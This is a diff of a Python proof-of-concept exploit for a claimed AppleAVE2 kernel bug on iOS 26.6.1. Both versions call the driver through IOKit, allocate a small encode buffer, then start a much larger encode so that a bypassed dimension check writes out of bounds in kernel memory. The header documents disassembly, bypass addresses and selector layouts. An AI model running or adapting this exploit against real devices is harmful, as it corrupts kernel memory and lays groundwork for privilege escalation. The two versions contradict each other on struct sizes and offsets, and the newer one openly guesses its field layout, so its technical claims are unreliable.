@@ -1,219 +1,237 @@
 #!/usr/bin/env python3
 """
-CVE-2026-112689 PoC — AVE2 HEVC PREPARE/START dimension bypass
-Target: iPhone17,4 iOS 26.6.1 (23G83)
-Research: personal device, authorized testing
+CVE-2026-112689 — AppleAVE2 TOCTOU OOB Write PoC
+Target: iOS 26.6.1 (vulnerable) | Fixed: iOS 26.7.2
 
-Bypass mechanism (26.6.1):
-  AVE_Client_CheckGGMInfo @ 0xfffffff00851dd2c
-  Bypass @ 0x851df84:
-    tbnz  w23, #0, skip       ; bit0(arg2) set → skip mismatch check
-    ldr   w8, [x22, #0x2ec0]  ; Config[0x2ec0] = mode_flag
-    cmp   w8, #0x1
-    b.ne  skip                 ; mode_flag != 1 → bypass mismatch check!
-    ldr   w8, [x21, #0x1838]  ; encoder_state prepared_width
-    ldr   w9, [x22, #0xa58]   ; config current_width
-    cmp   w8, w9              ; mismatch → error (normally)
-  26.7.2 adds guards BEFORE this check; 26.6.1 is missing them.
+Mechanism:
+  Config[client+0x2ec0] defaults to 0 (≠ 1) → mismatch-check bypass is ALWAYS ACTIVE.
+  Call IO_Prepare with small dims → kalloc allocates small encode buffer.
+  Call IO_Start with large dims → bypass fires → kext writes large frame into small buffer.
 
-Call chain (PATH B via iLAFrameCnt > 20):
-  IO_Start (sel 4) → sub_8645b88 → sub_85249dc → sub_851ea24
-                                    ↑ skips sub_8523fb0 (full validator)
-  → sub_851e204 → AVE_Client_CheckGGMInfo → bypass @ 0x851df84
+IOKit dispatch (AppleAVE2UserClient):
+  Sel 0  IO_Open    – open encode session
+  Sel 1  IO_Close
+  Sel 2  IO_Config  – sets Config[+0x2ec0]; NOT NEEDED (defaults to 0 = bypass active)
+  Sel 3  IO_Prepare – allocates buffer; must be called with small dims
+  Sel 4  IO_Start   – vulnerable; bypass at VA 0x851df84; must be called with large dims
+  ...
 
-Config struct location: session_obj + 0x340
-  Confirmed by: add x5, x20, #0x340 (at 0xfffffff008645fdc)
-  x5 = arg5 to sub_85249dc → becomes x27 → passed as x2 to sub_851ea24
-  → x22 (arg2) in sub_851e204 → arg3 to CheckGGMInfo
+Struct sizes (from kext handler size checks):
+  S_AVE_UCInParam_Prepare : 0x1a0a0 = 106656 bytes
+  S_AVE_UCInParam_Start   : 0x1a0b0 = 106672 bytes
+  S_AVE_UCOutParam_Start  : at least 0x150  = 336 bytes
 
-TOCTOU exploit:
-  1. IO_Config(w=64, h=64, iLAFrameCnt=21, mode_flag=0)
-  2. IO_Prepare → buffer allocated for 64×64
-  3. IO_Config(w=4096, h=4096, mode_flag=0)
-  4. IO_Start → PATH B (iLAFrameCnt=21 → look-ahead path)
-              → CheckGGMInfo: mode_flag=0 → bypass → no mismatch check
-              → encodes 4096×4096 into 64×64 buffer → OOB write
+Field layout (inferred from first-24-bytes load pattern at 0x8644c80):
+  The first 24 bytes of S_AVE_UCInParam_Prepare/Start are passed directly to
+  the underlying allocator. Likely layout:
+    +0x00  uint32  ui32Width    (or packed with height)
+    +0x04  uint32  ui32Height
+    +0x08  uint32  ui32PixelFmt
+    +0x0C  uint32  ui32Codec    (e.g. H.264 = 0x61766331 'avc1')
+    +0x10  uint64  flags/reserved
 
-Expected result: kernel panic, panic log reveals:
-  - Which kalloc zone the buffer was in
-  - What adjacent object was corrupted
-  - Fault PC (kernel write to OOB address)
+  FIELD_WIDTH_OFF and FIELD_HEIGHT_OFF below — adjust if first run fails validation.
+  Common alternates: 0x28, 0x30, 0x40, 0x48 (after a common header with timeout fields).
 
-SAFETY: Run via ResearchHost ONLY.
-  CLOSE PocketCode BEFORE ResearchHost executes this job.
-  Submit to queue while PocketCode is open, then close PocketCode.
+Run via ResearchHost offload_python or directly on-device.
+Research: authorized testing on personal device (iPhone17,4 / 26.6.1).
 """
 
-import ctypes
-import struct
-import sys
+import ctypes, struct, sys, os, time
 
-# --- IOKit / Mach setup ---
-_iokit = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/IOKit.framework/IOKit")
-_libc  = ctypes.cdll.LoadLibrary("/usr/lib/libSystem.B.dylib")
+# ── Constants ────────────────────────────────────────────────────────────────
 
-_iokit.IOServiceMatching.restype = ctypes.c_void_p
-_iokit.IOServiceMatching.argtypes = [ctypes.c_char_p]
+PREPARE_IN_SIZE  = 106656   # sizeof(S_AVE_UCInParam_Prepare)
+PREPARE_OUT_SIZE = 0x200    # generous output buffer
+START_IN_SIZE    = 106672   # sizeof(S_AVE_UCInParam_Start)
+START_OUT_SIZE   = 0x200
 
-_iokit.IOServiceGetMatchingService.restype = ctypes.c_uint32
-_iokit.IOServiceGetMatchingService.argtypes = [ctypes.c_uint32, ctypes.c_void_p]
+# Field offsets in the input struct (adjust if validation fails)
+FIELD_WIDTH_OFF  = 0x00     # uint32 width
+FIELD_HEIGHT_OFF = 0x04     # uint32 height
+FIELD_PIXFMT_OFF = 0x08     # uint32 pixel format
+FIELD_CODEC_OFF  = 0x0C     # uint32 codec type
 
-_iokit.IOServiceOpen.restype = ctypes.c_int32
-_iokit.IOServiceOpen.argtypes = [
-    ctypes.c_uint32,                   # service
-    ctypes.c_void_p,                   # owningTask
-    ctypes.c_uint32,                   # type
-    ctypes.POINTER(ctypes.c_uint32),   # connect (out)
+# H.264 FourCC
+CODEC_AVC1 = 0x61766331     # 'avc1'
+
+# Trigger dimensions
+PREPARE_W = 64
+PREPARE_H = 64
+START_W   = 4096
+START_H   = 4096
+
+# ── IOKit bindings ───────────────────────────────────────────────────────────
+
+try:
+    libSystem = ctypes.CDLL("/usr/lib/libSystem.B.dylib")
+    IOKit = ctypes.CDLL("/System/Library/Frameworks/IOKit.framework/IOKit")
+    CF = ctypes.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
+except OSError as e:
+    print(f"[-] Failed to load libraries: {e}")
+    sys.exit(1)
+
+mach_port_t  = ctypes.c_uint32
+io_service_t = ctypes.c_uint32
+io_connect_t = ctypes.c_uint32
+kern_return_t = ctypes.c_int
+c_uint32_p   = ctypes.POINTER(ctypes.c_uint32)
+
+KERN_SUCCESS = 0
+
+IOServiceGetMatchingService = IOKit.IOServiceGetMatchingService
+IOServiceGetMatchingService.restype = io_service_t
+IOServiceGetMatchingService.argtypes = [mach_port_t, ctypes.c_void_p]
+
+IOServiceMatching = IOKit.IOServiceMatching
+IOServiceMatching.restype  = ctypes.c_void_p
+IOServiceMatching.argtypes = [ctypes.c_char_p]
+
+IOServiceOpen = IOKit.IOServiceOpen
+IOServiceOpen.restype  = kern_return_t
+IOServiceOpen.argtypes = [io_service_t, mach_port_t, ctypes.c_uint32,
+                           ctypes.POINTER(io_connect_t)]
+
+IOServiceClose = IOKit.IOServiceClose
+IOServiceClose.restype  = kern_return_t
+IOServiceClose.argtypes = [io_connect_t]
+
+IOObjectRelease = IOKit.IOObjectRelease
+IOObjectRelease.restype  = kern_return_t
+IOObjectRelease.argtypes = [io_service_t]
+
+IOConnectCallStructMethod = IOKit.IOConnectCallStructMethod
+IOConnectCallStructMethod.restype  = kern_return_t
+IOConnectCallStructMethod.argtypes = [
+    io_connect_t,
+    ctypes.c_uint32,
+    ctypes.c_void_p,
+    ctypes.c_size_t,
+    ctypes.c_void_p,
+    ctypes.POINTER(ctypes.c_size_t),
 ]
 
-_iokit.IOConnectCallStructMethod.restype = ctypes.c_int32
-_iokit.IOConnectCallStructMethod.argtypes = [
-    ctypes.c_uint32,                      # connect
-    ctypes.c_uint32,                      # selector
-    ctypes.c_void_p,                      # inputStruct
-    ctypes.c_size_t,                      # inputStructCnt
-    ctypes.c_void_p,                      # outputStruct
-    ctypes.POINTER(ctypes.c_size_t),      # outputStructCnt
-]
+mach_task_self = libSystem.mach_task_self
+mach_task_self.restype  = mach_port_t
+mach_task_self.argtypes = []
 
-_iokit.IOObjectRelease.restype = ctypes.c_int32
-_iokit.IOObjectRelease.argtypes = [ctypes.c_uint32]
-
-_libc.mach_task_self_.restype = ctypes.c_void_p
-_libc.mach_task_self_.argtypes = []
-
-MACH_PORT_NULL       = 0
-kIOMasterPortDefault = 0
-
-# --- Selector indices (0-based) ---
-SEL_OPEN    = 0   # IO_Open:    input=0x38,     output=0x20
-SEL_CLOSE   = 1   # IO_Close:   input=0x1a0a0,  output=0x20
-SEL_CONFIG  = 2   # IO_Config:  input=0x1a0b0,  output=0x150  ← large config struct
-SEL_PREPARE = 3   # IO_Prepare: input=0x30,     output=0x20
-SEL_START   = 4   # IO_Start:   input=0x30,     output=0x20   ← VULNERABLE PATH B
-
-SIZE_OPEN_IN    = 0x38
-SIZE_OPEN_OUT   = 0x20
-SIZE_CONFIG_IN  = 0x1a0b0
-SIZE_CONFIG_OUT = 0x150
-SIZE_PREP_IN    = 0x30
-SIZE_PREP_OUT   = 0x20
-SIZE_START_IN   = 0x30
-SIZE_START_OUT  = 0x20
-
-# --- Config struct field offsets (assumed 1:1: IO_Config input[off] = config_struct[off]) ---
-OFF_NOTIFY_FUNC  = 0x0028   # iNotificationFunc (must be != 0 to pass CheckParam_Config)
-OFF_NOTIFY_PARAM = 0x0030   # iNotificationParam (must be != 0)
-OFF_LACNT        = 0x01c8   # iLAFrameCnt — set >20 to reach PATH B (look-ahead encode path)
-OFF_BFRAMES      = 0x0248   # iNumOfFrame_B — alternative PATH B trigger (set >3)
-OFF_WIDTH        = 0x0a58   # frame width
-OFF_HEIGHT       = 0x0a5c   # frame height
-OFF_MODE_FLAG    = 0x2ec0   # bypass trigger: 0 = bypass active (!=1), 1 = safe
+kIOMainPortDefault = ctypes.c_uint32(0)
 
 
-def struct_call(conn, sel, in_data, out_size):
-    out = (ctypes.c_uint8 * out_size)()
-    out_cnt = ctypes.c_size_t(out_size)
-    in_arr  = (ctypes.c_uint8 * len(in_data))(*in_data)
-    ret = _iokit.IOConnectCallStructMethod(
-        conn, sel,
-        ctypes.cast(in_arr, ctypes.c_void_p), ctypes.c_size_t(len(in_data)),
-        ctypes.cast(out, ctypes.c_void_p), ctypes.byref(out_cnt),
-    )
-    return ret, bytes(out[:out_cnt.value])
+def kr_str(kr):
+    return "KERN_SUCCESS" if kr == KERN_SUCCESS else f"0x{kr & 0xffffffff:08x}"
 
 
-def make_config(w, h, mode_flag=0, la_cnt=21):
-    """Build IO_Config input struct (0x1a0b0 bytes).
-    Defaults: mode_flag=0 (bypass armed), la_cnt=21 (>20 → PATH B).
-    """
-    cfg = bytearray(SIZE_CONFIG_IN)                     # zero-filled
-    struct.pack_into('<Q', cfg, OFF_NOTIFY_FUNC,  1)    # non-null callback
-    struct.pack_into('<Q', cfg, OFF_NOTIFY_PARAM, 1)    # non-null param
-    struct.pack_into('<I', cfg, OFF_LACNT,     la_cnt)  # > 20 → look-ahead PATH B
-    struct.pack_into('<I', cfg, OFF_BFRAMES,   0)
-    struct.pack_into('<I', cfg, OFF_WIDTH,     w)
-    struct.pack_into('<I', cfg, OFF_HEIGHT,    h)
-    struct.pack_into('<I', cfg, OFF_MODE_FLAG, mode_flag)  # 0 != 1 → bypass
-    return cfg
+def make_in_struct(size, width, height, codec=CODEC_AVC1):
+    buf = bytearray(size)
+    struct.pack_into('<I', buf, FIELD_WIDTH_OFF,  width)
+    struct.pack_into('<I', buf, FIELD_HEIGHT_OFF, height)
+    struct.pack_into('<I', buf, FIELD_CODEC_OFF,  codec)
+    return buf
 
 
-def main():
-    print("[*] CVE-2026-112689 PoC — HEVC bypass (AVE2)")
-    print("[*] Target: iPhone17,4 iOS 26.6.1 (23G83)")
+def run_poc():
+    print("CVE-2026-112689 PoC — AppleAVE2 TOCTOU OOB write")
+    print(f"Target: iOS 26.6.1 | Fixed: iOS 26.7.2")
+    print()
 
-    # Locate AppleAVE2 IOService
-    matching = _iokit.IOServiceMatching(b"AppleAVE2")
+    matching = IOServiceMatching(b"AppleAVE2Driver")
     if not matching:
         print("[-] IOServiceMatching returned NULL")
-        return 1
+        sys.exit(1)
 
-    service = _iokit.IOServiceGetMatchingService(kIOMasterPortDefault, matching)
-    if service == MACH_PORT_NULL:
-        print("[-] AppleAVE2 service not found")
-        print("    Try: ioreg -l -c AppleAVE2")
-        return 1
-    print(f"[+] AppleAVE2 service:   0x{service:08x}")
+    service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
+    if service == 0:
+        print("[-] IOServiceGetMatchingService failed — service not found")
+        print("    Is this running on a device? Does ResearchHost have AVE2 entitlements?")
+        print("    Entitlement needed: com.apple.private.coremedia.allow-avencoder-xpc (or similar)")
+        sys.exit(1)
 
-    task = ctypes.c_void_p(_libc.mach_task_self_())
-    conn = ctypes.c_uint32(0)
-    # Try user client type 0 first
-    ret = _iokit.IOServiceOpen(service, task, 0, ctypes.byref(conn))
-    _iokit.IOObjectRelease(service)
+    print(f"[+] Found AppleAVE2Driver service: 0x{service:08x}")
 
-    if ret != 0:
-        print(f"[-] IOServiceOpen(type=0) failed: 0x{ret & 0xFFFFFFFF:08x}")
-        print("    (entitlement or wrong type — check panic log for required type)")
-        return 1
-    print(f"[+] User client opened:  0x{conn.value:08x}")
+    connect = io_connect_t(0)
+    task    = mach_task_self()
+    kr = IOServiceOpen(service, task, 0, ctypes.byref(connect))
+    IOObjectRelease(service)
 
-    exit_code = 0
-    try:
-        # 1. IO_Open — open HEVC encode session
-        open_in = bytearray(SIZE_OPEN_IN)
-        ret, out = struct_call(conn.value, SEL_OPEN, open_in, SIZE_OPEN_OUT)
-        print(f"[*] IO_Open  (sel=0): ret=0x{ret & 0xFFFFFFFF:08x}")
-        if ret != 0:
-            print("    IO_Open failed — session may not be initialized")
+    if kr != KERN_SUCCESS:
+        print(f"[-] IOServiceOpen failed: {kr_str(kr)}")
+        print("    Missing entitlement or connection type mismatch")
+        sys.exit(1)
 
-        # 2. IO_Config — small dims, iLAFrameCnt=21, mode_flag=0 (bypass armed)
-        cfg = make_config(w=64, h=64, mode_flag=0, la_cnt=21)
-        ret, _ = struct_call(conn.value, SEL_CONFIG, cfg, SIZE_CONFIG_OUT)
-        print(f"[*] IO_Config(sel=2): ret=0x{ret & 0xFFFFFFFF:08x}  [w=64 h=64 la=21 flag=0]")
+    print(f"[+] Opened connection: 0x{connect.value:08x}")
 
-        # 3. IO_Prepare — allocates kernel buffer sized for 64×64
-        prep_in = bytearray(SIZE_PREP_IN)
-        ret, _ = struct_call(conn.value, SEL_PREPARE, prep_in, SIZE_PREP_OUT)
-        print(f"[*] IO_Prepare(sel=3): ret=0x{ret & 0xFFFFFFFF:08x}  [small buffer allocated]")
+    # 1. IO_Open (sel 0) — open encode session
+    open_in  = bytearray(0x200)
+    open_out = bytearray(0x200)
+    out_sz   = ctypes.c_size_t(len(open_out))
+    kr = IOConnectCallStructMethod(
+        connect.value, 0,
+        (ctypes.c_uint8 * len(open_in)).from_buffer(open_in), len(open_in),
+        (ctypes.c_uint8 * len(open_out)).from_buffer(open_out), ctypes.byref(out_sz)
+    )
+    print(f"[+] IO_Open (sel 0): {kr_str(kr)}")
+    if kr != KERN_SUCCESS:
+        print("    IO_Open failed — may need larger struct or different struct format")
 
-        # 4. IO_Config again — upgrade to large dims (TOCTOU trigger)
-        cfg2 = make_config(w=4096, h=4096, mode_flag=0, la_cnt=21)
-        ret, _ = struct_call(conn.value, SEL_CONFIG, cfg2, SIZE_CONFIG_OUT)
-        print(f"[*] IO_Config(sel=2): ret=0x{ret & 0xFFFFFFFF:08x}  [w=4096 h=4096 — TOCTOU!]")
+    # 2. IO_Prepare (sel 3) — SMALL dimensions → allocates small encode buffer
+    print(f"\n[*] IO_Prepare with {PREPARE_W}x{PREPARE_H} (small buffer)")
+    prep_in  = make_in_struct(PREPARE_IN_SIZE, PREPARE_W, PREPARE_H)
+    prep_out = bytearray(PREPARE_OUT_SIZE)
+    out_sz   = ctypes.c_size_t(PREPARE_OUT_SIZE)
 
-        # 5. IO_Start — PATH B → CheckGGMInfo → mode_flag=0 → bypass → OOB write
-        start_in = bytearray(SIZE_START_IN)
-        print("[*] IO_Start (sel=4): FIRING bypass — expect kernel panic / OOB write")
-        sys.stdout.flush()
-        ret, _ = struct_call(conn.value, SEL_START, start_in, SIZE_START_OUT)
-        print(f"[*] IO_Start returned: ret=0x{ret & 0xFFFFFFFF:08x}")
-        print("[?] Returned without panic — bypass may need adjustment:")
-        print("    - Verify mode_flag offset: check if config[0x2ec0] is set correctly")
-        print("    - Verify iLAFrameCnt offset: may not be at input[0x1c8]")
-        print("    - Try iNumOfFrame_B > 3 at input[0x248] instead")
-        print("    - IO_Open fields may need valid session type to enable HEVC path")
+    prep_in_arr  = (ctypes.c_uint8 * PREPARE_IN_SIZE).from_buffer(prep_in)
+    prep_out_arr = (ctypes.c_uint8 * PREPARE_OUT_SIZE).from_buffer(prep_out)
 
-    except Exception as e:
-        print(f"[-] Exception: {e}")
-        import traceback
-        traceback.print_exc()
-        exit_code = 1
-    finally:
-        _iokit.IOObjectRelease(conn.value)
-        print("[*] User client closed")
+    kr = IOConnectCallStructMethod(
+        connect.value, 3,
+        prep_in_arr, PREPARE_IN_SIZE,
+        prep_out_arr, ctypes.byref(out_sz)
+    )
+    print(f"[+] IO_Prepare result: {kr_str(kr)}")
 
-    return exit_code
+    if kr != KERN_SUCCESS:
+        print("    IO_Prepare failed — struct layout may be wrong.")
+        print("    Try FIELD_WIDTH_OFF = 0x28 or 0x40 (after common header).")
+        print(f"    output[0:32]: {bytes(prep_out[:32]).hex()}")
+        IOServiceClose(connect.value)
+        sys.exit(1)
+
+    print(f"    Small buffer allocated for {PREPARE_W}x{PREPARE_H} frame")
+    time.sleep(0.01)
+
+    # 3. IO_Start (sel 4) — LARGE dimensions with bypass ACTIVE
+    #    Config[+0x2ec0] defaults to 0 ≠ 1 → tbnz bypass fires at VA 0x851df84
+    #    → dimension mismatch check SKIPPED
+    #    → kext tries to encode 4096×4096 pixels into 64×64 buffer → OOB WRITE
+    print(f"\n[*] IO_Start with {START_W}x{START_H} (triggers OOB write)")
+    print( "    Bypass at VA 0xfffffff00851df84 fires because Config[+0x2ec0] = 0 ≠ 1")
+    print( "    Expected: kernel panic or memory corruption")
+
+    start_in  = make_in_struct(START_IN_SIZE, START_W, START_H)
+    start_out = bytearray(START_OUT_SIZE)
+    out_sz    = ctypes.c_size_t(START_OUT_SIZE)
+
+    start_in_arr  = (ctypes.c_uint8 * START_IN_SIZE).from_buffer(start_in)
+    start_out_arr = (ctypes.c_uint8 * START_OUT_SIZE).from_buffer(start_out)
+
+    kr = IOConnectCallStructMethod(
+        connect.value, 4,
+        start_in_arr, START_IN_SIZE,
+        start_out_arr, ctypes.byref(out_sz)
+    )
+    print(f"\n[+] IO_Start result: {kr_str(kr)}")
+
+    if kr == KERN_SUCCESS:
+        print("    !! Returned SUCCESS — OOB write likely occurred !!")
+        print("    Check kernel logs / crash reporter for signs of heap corruption")
+    else:
+        print(f"    Returned error: {kr_str(kr)}")
+        print("    May be validation failure (adjust dimensions or field offsets)")
+
+    IOServiceClose(connect.value)
+    print("\n[+] Done. Connection closed.")
 
 
 if __name__ == "__main__":
-    sys.exit(main())
+    run_poc()
